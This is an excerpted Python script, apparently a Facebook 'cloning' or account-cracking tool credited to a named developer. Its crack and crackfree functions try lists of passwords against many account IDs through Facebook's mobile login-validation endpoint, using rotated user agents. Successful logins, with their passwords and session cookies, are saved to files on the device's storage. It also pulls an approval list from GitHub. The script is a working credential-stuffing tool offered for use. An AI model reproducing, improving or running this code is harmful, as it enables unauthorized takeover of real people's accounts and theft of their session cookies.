...
prinCP=[]
try:
    prox= requests.get('https://www.facebook.com/Ariyan.of.king143').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/ARIYAN-AHMED-143/Tricks/blob/main/Approvel.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/Ariyan.of.king143?mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
logo =(f"""
 \x1b[0;90m    _    ____  _____   __ _    _   _  
 \x1b[0;90m   / \  |  _ \|_ _\ \ / // \  | \ | | 
 \x1b[0;90m / _ \ | |_) || | \ V // _ \ |  \| | 
 \x1b[0;90m/ ___ \|  _ < | |  | |/ ___ \| |\  | 
\x1b[0;90m/_/   \_\_| \_\___| |_/_/   \_\_| \_|
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mARIYAN AHMED
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mmARIYAN CHOWDHURY 
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python ARIYAN-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ARIYAN-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mARIYAN-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
           ...
           #     os.system('espeak -a 300 " ARAFAT,  Ok,  id"')
                open('/sdcard/ARIYAN M2-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[ARIYAN-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mARIYAN-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ARIYAN-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
              #  os.system('espeak -a 300 " ARAFAT,  Ok,  id"')
                open('/sdcard/ARIYAN M3-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
